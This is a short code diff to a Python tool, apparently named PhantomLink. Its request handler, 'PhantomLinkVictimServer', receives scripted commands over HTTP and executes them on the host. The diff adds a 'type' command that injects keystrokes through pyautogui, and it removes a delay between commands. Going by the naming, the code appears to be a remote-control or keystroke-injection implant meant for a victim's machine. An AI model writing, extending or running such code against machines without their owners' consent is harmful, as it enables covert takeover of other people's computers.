@@ -39,6 +39,14 @@ def try_run_from_phantomscript_command(phantomscript_command: str) -> tuple:
 
             return (200, "Successful.")
         
+        elif opcode == 'type':
+            # ! pyautogui.write(" ".join(args))
+            # ! doesn't write with capitilization
+            pyautogui.typewrite(' '.join(args))
+
+            return (200, "Successful.")
+
+
         elif opcode == 'sleep':
             sleep(float(args[0]) / 1000)
             return (200, "Successful.")
@@ -57,7 +65,6 @@ class PhantomLinkVictimServer(BaseHTTPRequestHandler):
                 for line in payload.splitlines():
                     currentStatusCode, message = try_run_from_phantomscript_command(line)
                     if not str(currentStatusCode).startswith(("4", "3")): continue
-                    sleep(0.1)
                         
                     self.send_response(currentStatusCode)
                     self.end_headers()
